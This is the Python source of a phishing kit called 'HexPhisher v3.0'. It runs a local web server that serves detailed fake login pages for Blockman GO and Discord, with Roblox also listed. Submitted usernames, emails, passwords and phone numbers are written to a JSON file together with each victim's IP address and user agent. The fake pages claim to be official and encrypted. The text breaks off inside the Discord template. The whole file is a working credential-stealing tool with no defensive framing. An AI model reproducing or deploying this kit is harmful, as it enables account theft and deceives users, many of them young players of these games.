#!/usr/bin/env python3
# HexPhisher v3.0 - Ultra Detailed Visual Replicas
import http.server
import socketserver
import threading
import time
import os
import urllib.parse
import json
import socket
from datetime import datetime
import random

# Configuration
PORT = 8080
LOG_FILE = "credentials.json"
IP = "127.0.0.1"
VERSION = "3.0"

# Server handler class
class HexPhisherHandler(http.server.BaseHTTPRequestHandler):
    current_service = "blockmango"
    services = {
        "blockmango": "Blockman GO",
        "discord": "Discord",
        "roblox": "Roblox"
    }
    
    def log_request(self, code='-', size='-'):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = self.get_html_template()
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        parsed_data = urllib.parse.parse_qs(post_data)
        
        creds = {}
        for key in parsed_data:
            if key in ['username', 'email', 'password', 'account', 'phone']:
                creds[key] = parsed_data[key][0]
        
        self.log_credentials(creds)
        
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()
    
    def log_credentials(self, creds):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        service = self.services.get(self.current_service, "Unknown")
        
        log_entry = {
            "timestamp": timestamp,
            "service": service,
            "credentials": creds,
            "ip": self.client_address[0],
            "user_agent": self.headers.get('User-Agent', 'Unknown')
        }
        
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
        except:
            pass
        
        print(f"\033[92m[+] {timestamp} | {service}\033[0m")
        for key, value in creds.items():
            print(f"    \033[93m{key}:\033[0m \033[97m{value}\033[0m")
        print(f"    \033[90mIP: {self.client_address[0]}\033[0m")
        print()
    
    def get_html_template(self):
        if self.current_service == "blockmango":
            return BLOCKMANGO_HTML
        elif self.current_service == "discord":
            return DISCORD_HTML
        elif self.current_service == "roblox":
            return ROBLOX_HTML
        return "<h1>Service not available</h1>"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
    # Blockman Go HTML Template - Part 1
BLOCKMANGO_PART1 = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockman GO - Official Login Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700;800;900&family=Orbitron:wght@400;500;600;700;800&family=Poppins:wght@300;400;500;600;700&display=swap');
        
        :root {
            --primary-blue: #00b2ff;
            --primary-purple: #7c3aed;
            --dark-bg: #0a0f1e;
            --container-bg: rgba(19, 29, 50, 0.97);
            --text-primary: #ffffff;
            --text-secondary: #94a3b8;
            --accent-glow: rgba(0, 178, 255, 0.3);
            --success-green: #22c55e;
            --warning-yellow: #ffd166;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        html {
            scroll-behavior: smooth;
        }
        
        body {
            font-family: 'Exo 2', 'Poppins', sans-serif;
            background: 
                linear-gradient(135deg, #0a0f1e 0%, #131a32 50%, #0d1428 100%),
                radial-gradient(circle at 20% 80%, rgba(0, 178, 255, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(124, 58, 237, 0.15) 0%, transparent 50%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
            color: var(--text-primary);
            line-height: 1.6;
        }
        
        .particles-container {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -2;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            border-radius: 50%;
            opacity: 0;
            animation: float 15s infinite linear;
        }
        
        .particle:nth-child(odd) {
            background: linear-gradient(45deg, var(--primary-blue), transparent);
        }
        
        .particle:nth-child(even) {
            background: linear-gradient(45deg, var(--primary-purple), transparent);
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg) scale(0.5);
                opacity: 0;
            }
            10% {
                opacity: 0.4;
            }
            90% {
                opacity: 0.4;
            }
            100% {
                transform: translateY(-100px) rotate(720deg) scale(1);
                opacity: 0;
            }
        }
        
        .main-container {
            background: var(--container-bg);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border-radius: 28px;
            padding: 50px 45px;
            width: 100%;
            max-width: 480px;
            box-shadow: 
                0 30px 80px rgba(0, 0, 0, 0.4),
                0 0 0 1px rgba(255, 255, 255, 0.08),
                inset 0 0 80px rgba(0, 178, 255, 0.08);
            border: 1.5px solid rgba(255, 255, 255, 0.12);
            position: relative;
            overflow: hidden;
            z-index: 1;
            transition: transform 0.5s ease, box-shadow 0.5s ease;
        }
        
        .main-container:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 40px 100px rgba(0, 178, 255, 0.2),
                0 0 0 1px rgba(255, 255, 255, 0.1);
        }
        
        .container-glow {
            position: absolute;
            top: -3px;
            left: -3px;
            right: -3px;
            bottom: -3px;
            background: linear-gradient(
                45deg,
                var(--primary-blue),
                var(--primary-purple),
                var(--primary-blue)
            );
            border-radius: 31px;
            z-index: -1;
            opacity: 0.4;
            filter: blur(15px);
            animation: rotateGradient 8s linear infinite;
        }
        
        @keyframes rotateGradient {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .logo-section {
            text-align: center;
            margin-bottom: 45px;
            position: relative;
        }
        
        .logo-icon {
            font-size: 56px;
            color: var(--primary-blue);
            margin-bottom: 20px;
            display: inline-block;
            text-shadow: 
                0 0 30px rgba(0, 178, 255, 0.7),
                0 0 60px rgba(0, 178, 255, 0.4);
            animation: iconFloat 3s ease-in-out infinite;
        }
        
        @keyframes iconFloat {
            0%, 100% { 
                transform: translateY(0) rotate(0deg); 
            }
            50% { 
                transform: translateY(-10px) rotate(5deg); 
            }
        }
        
        .logo-text {
            font-family: 'Orbitron', sans-serif;
            background: linear-gradient(
                90deg,
                var(--primary-blue) 0%,
                #a855f7 50%,
                var(--primary-purple) 100%
            );
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 46px;
            font-weight: 900;
            letter-spacing: 2px;
            margin-bottom: 12px;
            line-height: 1.1;
            text-shadow: 0 8px 25px rgba(0, 178, 255, 0.4);
        }
        
        .logo-subtitle {
            color: var(--text-secondary);
            font-size: 15px;
            font-weight: 500;
            letter-spacing: 1.2px;
            opacity: 0.9;
            position: relative;
            display: inline-block;
            padding: 0 15px;
        }
        
        .logo-subtitle::before,
        .logo-subtitle::after {
            content: '✦';
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            color: var(--primary-blue);
            font-size: 12px;
            opacity: 0.7;
        }
        
        .logo-subtitle::before {
            left: -5px;
        }
        
        .logo-subtitle::after {
            right: -5px;
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .login-title {
            color: var(--text-primary);
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 15px;
            position: relative;
            display: inline-block;
        }
        
        .login-title::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(
                90deg,
                var(--primary-blue),
                var(--primary-purple)
            );
            border-radius: 2px;
            transform: scaleX(0.7);
            transform-origin: center;
        }
        
        .login-subtitle {
            color: var(--text-secondary);
            font-size: 16px;
            max-width: 400px;
            margin: 0 auto;
            line-height: 1.7;
            opacity: 0.9;
        }
        
        .form-container {
            margin-bottom: 35px;
        }
        
        .form-group {
            margin-bottom: 30px;
            position: relative;
        }
        
        .form-label {
            display: block;
            color: #cbd5e0;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: color 0.3s ease;
        }
        
        .form-label:hover {
            color: var(--primary-blue);
        }
        
        .form-label i {
            color: var(--primary-blue);
            font-size: 20px;
            width: 24px;
            text-align: center;
        }
        
        .input-wrapper {
            position: relative;
            transition: transform 0.3s ease;
        }
        
        .input-wrapper:hover {
            transform: translateY(-2px);
        }
        
        .form-input {
            width: 100%;
            background: rgba(30, 41, 59, 0.9);
            border: 2px solid #334155;
            border-radius: 18px;
            padding: 22px 22px 22px 62px;
            color: var(--text-primary);
            font-size: 17px;
            font-weight: 500;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.1);
            outline: none;
        }
"""
BLOCKMANGO_PART2 = """
        .form-input:focus {
            border-color: var(--primary-blue);
            background: rgba(30, 41, 59, 1);
            box-shadow: 
                0 0 0 5px rgba(0, 178, 255, 0.2),
                0 15px 40px rgba(0, 178, 255, 0.25);
            transform: scale(1.02);
        }
        
        .form-input::placeholder {
            color: #64748b;
            font-weight: 400;
            opacity: 0.7;
        }
        
        .input-icon {
            position: absolute;
            left: 25px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--primary-blue);
            font-size: 22px;
            z-index: 2;
            transition: all 0.3s ease;
        }
        
        .input-wrapper:focus-within .input-icon {
            color: var(--primary-purple);
            transform: translateY(-50%) scale(1.1);
        }
        
        .password-toggle {
            position: absolute;
            right: 25px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #64748b;
            font-size: 20px;
            cursor: pointer;
            transition: color 0.3s ease;
            z-index: 2;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .password-toggle:hover {
            color: var(--primary-blue);
            background: rgba(0, 178, 255, 0.1);
        }
        
        .security-notice {
            background: linear-gradient(
                135deg,
                rgba(255, 209, 102, 0.15) 0%,
                rgba(124, 58, 237, 0.15) 100%
            );
            border-radius: 18px;
            padding: 22px;
            margin: 35px 0;
            color: var(--warning-yellow);
            font-size: 15px;
            text-align: center;
            border-left: 6px solid var(--warning-yellow);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            animation: gentlePulse 4s infinite;
            backdrop-filter: blur(10px);
        }
        
        @keyframes gentlePulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.9; }
        }
        
        .security-notice i {
            font-size: 24px;
            flex-shrink: 0;
        }
        
        .submit-button {
            width: 100%;
            background: linear-gradient(
                90deg,
                var(--primary-blue) 0%,
                var(--primary-purple) 100%
            );
            border: none;
            border-radius: 20px;
            padding: 24px;
            color: white;
            font-size: 19px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            letter-spacing: 0.5px;
            margin-top: 10px;
            text-transform: uppercase;
        }
        
        .submit-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                90deg,
                transparent,
                rgba(255, 255, 255, 0.25),
                transparent
            );
            transition: left 0.8s ease;
        }
        
        .submit-button:hover::before {
            left: 100%;
        }
        
        .submit-button:hover {
            transform: translateY(-4px) scale(1.02);
            box-shadow: 
                0 20px 50px rgba(0, 178, 255, 0.5),
                0 10px 30px rgba(124, 58, 237, 0.4);
        }
        
        .submit-button:active {
            transform: translateY(-1px) scale(0.99);
        }
        
        .submit-button i {
            font-size: 24px;
            transition: transform 0.3s ease;
        }
        
        .submit-button:hover i {
            transform: rotate(15deg) scale(1.2);
        }
        
        .additional-links {
            display: flex;
            justify-content: space-between;
            margin-top: 40px;
            padding-top: 35px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .link-item {
            color: var(--primary-blue);
            text-decoration: none;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 20px;
            border-radius: 14px;
            position: relative;
            overflow: hidden;
        }
        
        .link-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                90deg,
                transparent,
                rgba(0, 178, 255, 0.15),
                transparent
            );
            transition: left 0.6s ease;
        }
        
        .link-item:hover::before {
            left: 100%;
        }
        
        .link-item:hover {
            color: white;
            background: rgba(0, 178, 255, 0.15);
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 178, 255, 0.2);
        }
        
        .link-item i {
            font-size: 20px;
            transition: transform 0.3s ease;
        }
        
        .link-item:hover i {
            transform: scale(1.2);
        }
        
        .game-preview {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 45px;
            flex-wrap: wrap;
        }
        
        .preview-icon {
            width: 70px;
            height: 70px;
            border-radius: 20px;
            background: linear-gradient(135deg, #1e293b, #0f172a);
            border: 2px solid #334155;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: var(--text-secondary);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }
        
        .preview-icon::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                135deg,
                rgba(0, 178, 255, 0.2),
                rgba(124, 58, 237, 0.2)
            );
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .preview-icon:hover {
            transform: translateY(-8px) rotate(5deg) scale(1.1);
            border-color: var(--primary-blue);
            color: white;
            box-shadow: 
                0 15px 35px rgba(0, 178, 255, 0.3),
                inset 0 0 20px rgba(255, 255, 255, 0.1);
        }
        
        .preview-icon:hover::before {
            opacity: 1;
        }
        
        .footer {
            text-align: center;
            margin-top: 50px;
            color: #64748b;
            font-size: 14px;
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            padding-top: 30px;
        }
        
        .footer p {
            margin-bottom: 15px;
            opacity: 0.8;
        }
        
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            background: rgba(34, 197, 94, 0.15);
            color: var(--success-green);
            padding: 12px 25px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 700;
            margin-top: 20px;
            border: 1px solid rgba(34, 197, 94, 0.3);
            backdrop-filter: blur(10px);
        }
        
        .security-badge i {
            font-size: 18px;
            animation: lockShake 5s infinite;
        }
        
        @keyframes lockShake {
            0%, 100% { transform: rotate(0deg); }
            1% { transform: rotate(-5deg); }
            2% { transform: rotate(5deg); }
            3% { transform: rotate(-5deg); }
            4% { transform: rotate(0deg); }
        }
        
        .loader {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(19, 29, 50, 0.95);
            border-radius: 28px;
            z-index: 100;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 25px;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(0, 178, 255, 0.2);
            border-top: 5px solid var(--primary-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .main-container {
                padding: 35px 25px;
                margin: 20px;
                border-radius: 24px;
            }
            
            .logo-text {
                font-size: 38px;
            }
            
            .login-title {
                font-size: 28px;
            }
            
            .additional-links {
                flex-direction: column;
                gap: 15px;
                align-items: center;
            }
            
            .link-item {
                width: 100%;
                justify-content: center;
            }
        }
        
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(30, 41, 59, 0.3);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(
                var(--primary-blue),
                var(--primary-purple)
            );
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(
                var(--primary-purple),
                var(--primary-blue)
            );
        }
    </style>
</head>
<body>
    <div class="particles-container" id="particles"></div>
    
    <div class="main-container">
        <div class="container-glow"></div>
        
        <div class="logo-section">
            <div class="logo-icon"><i class="fas fa-gamepad"></i></div>
            <div class="logo-text">BLOCKMAN GO</div>
            <div class="logo-subtitle">Official Login Portal • Secure Access</div>
        </div>
        
        <div class="login-header">
            <h1 class="login-title">Login to Blockman GO</h1>
            <p class="login-subtitle">
                Access your games, friends, inventory, and exclusive content. 
                Secure login with 256-bit encryption.
            </p>
        </div>
        
        <form method="POST" class="form-container">
            <div class="form-group">
                <label class="form-label">
                    <i class="fas fa-user-astronaut"></i>
                    <span>Username or Email Address</span>
                </label>
                <div class="input-wrapper">
                    <div class="input-icon"><i class="fas fa-user"></i></div>
                    <input type="text" class="form-input" name="username" 
                           placeholder="Enter your username or email" 
                           required autocomplete="username">
                </div>
            </div>
            
            <div class="form-group">
                <label class="form-label">
                    <i class="fas fa-key"></i>
                    <span>Password</span>
                </label>
                <div class="input-wrapper">
                    <div class="input-icon"><i class="fas fa-lock"></i></div>
                    <input type="password" class="form-input" id="password" 
                           name="password" placeholder="Enter your password" 
                           required autocomplete="current-password">
                    <button type="button" class="password-toggle" id="togglePassword">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            
            <div class="security-notice">
                <i class="fas fa-shield-alt"></i>
                <span>Security verification required. Please confirm your identity to continue.</span>
            </div>
            
            <button type="submit" class="submit-button">
                <i class="fas fa-rocket"></i>
                <span>LOGIN TO BLOCKMAN GO</span>
            </button>
        </form>
        
        <div class="additional-links">
            <a href="#" class="link-item">
                <i class="fas fa-question-circle"></i>
                <span>Forgot Password?</span>
            </a>
            <a href="#" class="link-item">
                <i class="fas fa-user-plus"></i>
                <span>Create New Account</span>
            </a>
        </div>
        
        <div class="game-preview">
            <div class="preview-icon"><i class="fas fa-dragon"></i></div>
            <div class="preview-icon"><i class="fas fa-gem"></i></div>
            <div class="preview-icon"><i class="fas fa-crown"></i></div>
            <div class="preview-icon"><i class="fas fa-ghost"></i></div>
            <div class="preview-icon"><i class="fas fa-dice"></i></div>
        </div>
        
        <div class="footer">
            <p>© 2024 Blockman GO Studio. All rights reserved. | Version 4.3.1</p>
            <div class="security-badge">
                <i class="fas fa-lock"></i>
                <span>SSL Secured • 256-bit Encryption • Protected by AuthGuard</span>
            </div>
        </div>
        
        <div class="loader" id="loader">
            <div class="spinner"></div>
            <p style="color: var(--primary-blue); font-weight: 600;">
                Verifying credentials...
            </p>
        </div>
    </div>
    
    <script>
        // Generate particles
        const particlesContainer = document.getElementById('particles');
        for (let i = 0; i < 35; i++) {
            const particle = document.createElement('div');
            particle.classList.add('particle');
            const size = Math.random() * 50 + 10;
            particle.style.width = size + 'px';
            particle.style.height = size + 'px';
            particle.style.left = Math.random() * 100 + 'vw';
            particle.style.top = '100vh';
            particle.style.animationDelay = Math.random() * 20 + 's';
            particle.style.animationDuration = Math.random() * 30 + 20 + 's';
            particlesContainer.appendChild(particle);
        }
        
        // Password toggle
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');
        
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
        });
        
        // Form submission animation
        const form = document.querySelector('form');
        const loader = document.getElementById('loader');
        
        form.addEventListener('submit', function(e) {
            loader.style.display = 'flex';
            setTimeout(() => {
                loader.style.display = 'none';
            }, 2000);
        });
        
        // Input focus effects
        const inputs = document.querySelectorAll('.form-input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'translateY(-4px)';
            });
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'translateY(-2px)';
            });
        });
        
        // Preview icon hover effects
        const previewIcons = document.querySelectorAll('.preview-icon');
        previewIcons.forEach(icon => {
            icon.addEventListener('mouseenter', function() {
                const icons = document.querySelectorAll('.preview-icon');
                icons.forEach(otherIcon => {
                    if (otherIcon !== this) {
                        otherIcon.style.transform = 'scale(0.95)';
                        otherIcon.style.opacity = '0.7';
                    }
                });
            });
            
            icon.addEventListener('mouseleave', function() {
                const icons = document.querySelectorAll('.preview-icon');
                icons.forEach(otherIcon => {
                    otherIcon.style.transform = '';
                    otherIcon.style.opacity = '';
                });
            });
        });
    </script>
</body>
</html>"""

BLOCKMANGO_HTML = BLOCKMANGO_PART1 + BLOCKMANGO_PART2
# Discord HTML Template
DISCORD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Your Place to Talk and Hang Out</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --discord-blurple: #5865f2;
            --discord-dark: #36393f;
            --discord-darker: #2f3136;
            --discord-input: #40444b;
            --discord-text: #ffffff;
            --discord-subtext: #b9bbbe;
            --discord-link: #00aff4;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Roboto', sans-serif;
        }
        
        body {
            background: 
                radial-gradient(circle at 20% 80%, var(--discord-blurple) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, #404eed 0%, transparent 50%),
                var(--discord-dark);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--discord-text);
            overflow: hidden;
            position: relative;
        }
        
        .discord-bg {
            position: absolute;
            width: 100%;
            height: 100%;
            background: 
                repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255,255,255,0.02) 10px, rgba(255,255,255,0.02) 20px);
            z-index: -1;
            opacity: 0.3;
        }
        
        .login-wrapper {
            width: 100%;
            max-width: 480px;
            background: rgba(47, 49, 54, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 12px;
            padding: 40px;
            box-shadow: 
                0 25px 75px rgba(0, 0, 0, 0.6),
                0 0 0 1px rgba(255, 255, 255, 0.05),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.08);
            position: relative;
            overflow: hidden;
        }
        
        .discord-glow {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--discord-blurple), #404eed, var(--discord-blurple));
            animation: slideGlow 3s linear infinite;
        }
        
        @keyframes slideGlow {
            0% { background-position: -480px 0; }
            100% { background-position: 480px 0; }
        }
        
        .header-section {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .discord-logo {
            font-size: 42px;
            color: var(--discord-blurple);
            margin-bottom: 20px;
            text-shadow: 0 0 30px rgba(88, 101, 242, 0.5);
            animation: logoFloat 4s ease-in-out infinite;
        }
        
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-10px) scale(1.05); }
        }
        
        .welcome-title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #ffffff, var(--discord-subtext));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .welcome-subtitle {
            color: var(--discord-subtext);
            font-size: 16px;
            font-weight: 500;
            opacity: 0.9;
        }
        
        .form-section {
            margin-bottom: 25px;
        }
        
        .input-container {
            margin-bottom: 25px;
            position: relative;
        }
        
        .input-label {
            display: block;
            color: var(--discord-subtext);
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .input-label i {
            color: var(--discord-blurple);
            font-size: 14px;
        }
        
        .input-field {
            width: 100%;
            background: var(--discord-input);
            border: 1px solid rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            padding: 16px;
            color: var(--discord-text);
            font-size: 16px;
            font-weight: 400;
            transition: all 0.3s ease;
            outline: none;
        }
        
        .input-field:focus {
            border-color: var(--discord-blurple);
            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
        }
        
        .input-field::placeholder {
            color: rgba(185, 187, 190, 0.6);
        }
        
        .forgot-link {
            display: block;
            color: var(--discord-link);
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 25px;
            transition: all 0.3s ease;
            padding: 8px 0;
        }
        
        .forgot-link:hover {
            color: #ffffff;
            text-decoration: underline;
            transform: translateX(5px);
        }
        
        .login-button {
            width: 100%;
            background: var(--discord-blurple);
            border: none;
            border-radius: 4px;
            padding: 18px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
            position: relative;
            overflow: hidden;
        }
        
        .login-button:hover {
            background: #4752c4;
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(88, 101, 242, 0.4);
        }
        
        .login-button:active {
            transform: translateY(0);
        }
        
        .login-button::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 5px;
            height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }
        
        .login-button:focus:not(:active)::after {
            animation: ripple 1s ease-out;
        }
        
        @keyframes ripple {
            0% {
                transform: scale(0, 0);
                opacity: 0.5;
            }
            100% {
                transform: scale(40, 40);
                opacity: 0;
            }
        }
        
        .register-section {
            color: var(--discord-subtext);
            font-size: 14px;
            text-align: center;
            margin-top: 20px;
        }
        
        .register-link {
            color: var(--discord-link);
            text-decoration: none;
            font-weight: 600;
            margin-left: 5px;
            transition: all 0.3s ease;
        }
        
        .register-link:hover {
            color: #ffffff;
            text-decoration: underline;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 30px 0;
            color: var(--discord-subtext);
            font-size: 14px;
        }
        
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .divider span {
            padding: 0 15px;
            font-weight: 600;
            opacity: 0.7;
        }
        
        .qrcode-section {
            text-align: center;
            background: rgba(32, 34, 37, 0.8);
            border-radius: 8px;
            padding: 30px;
            margin-top: 25px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .qrcode-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 20px;
            color: var(--discord-subtext);
        }
        
        .qrcode-placeholder {
            width: 160px;
            height: 160px;
            background: rgba(64, 68, 75, 0.5);
            border-radius: 12px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            border: 2px dashed rgba(88, 101, 242, 0.3);
        }
        
        .qrcode-placeholder::before {
            content: '';
            position: absolute;
            width: 80%;
            height: 80%;
            background: 
                linear-gradient(45deg, transparent 45%, rgba(88, 101, 242, 0.3) 50%, transparent 55%),
                linear-gradient(-45deg, transparent 45%, rgba(88, 101, 242, 0.3) 50%, transparent 55%);
            animation: scan 2s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        
        .qrcode-placeholder i {
            font-size: 48px;
            color: rgba(88, 101, 242, 0.5);
            z-index: 1;
        }
        
        .scan-text {
            color: var(--discord-subtext);
            font-size: 14px;
            max-width: 300px;
            margin: 0 auto;
            line-height: 1.5;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 25px;
            margin-top: 35px;
            padding-top: 25px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .footer-link {
            color: var(--discord-subtext);
            font-size: 12px;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        .footer-link:hover {
            color: #ffffff;
            text-decoration: underline;
        }
        
        .discord-footer {
            text-align: center;
            margin-top: 30px;
            color: rgba(185, 187, 190, 0.5);
            font-size: 12px;
        }
        
        @media (max-width: 520px) {
            .login-wrapper {
                padding: 30px 25px;
                margin: 15px;
            }
            
            .welcome-title {
                font-size: 24px;
            }
        }
        
        .input-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--discord-subtext);
            font-size: 18px;
            opacity: 0.5;
            transition: all 0.3s ease;
        }
        
        .input-container:focus-within .input-icon {
            color: var(--discord-blurple);
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="discord-bg"></div>
    
    <div class="login-wrapper">
        <div class="discord-glow"></div>
        
        <div class="header-section">
            <div class="discord-logo">
                <i class="fab fa-discord"></i>
            </div>
            <h1 class="welcome-title">Welcome back!</h1>
            <p class="welcome-subtitle">We're so excited to see you again!</p>
        </div>
        
        <form method="POST" class="form-section">
            <div class="input-container">
                <label class="input-label">
                    <i class="fas fa-envelope"></i>
                    <span>EMAIL OR PHONE NUMBER</span>
                </label>
                <input type="text" class="input-field" name="email" 
                       placeholder="Enter your email or phone number" required>
                <div class="input-icon"><i class="fas fa-user"></i></div>
            </div>
            
            <div class="input-container">
                <label class="input-label">
                    <i class="fas fa-key"></i>
                    <span>PASSWORD</span>
                </label>
                <input type="password" class="input-field" name="password" 
                       placeholder="Enter your password" required>
                <div class="input-icon"><i class="fas fa-lock"></i></div>
            </div>
            
            <a href="#" class="forgot-link">
                <i class="fas fa-question-circle"></i>
                Forgot your password?
            </a>
            
            <button type="submit" class="login-button">
                <i class="fas fa-sign-in-alt"></i>
                Log In
            </button>
        </form>
        
        <div class="register-section">
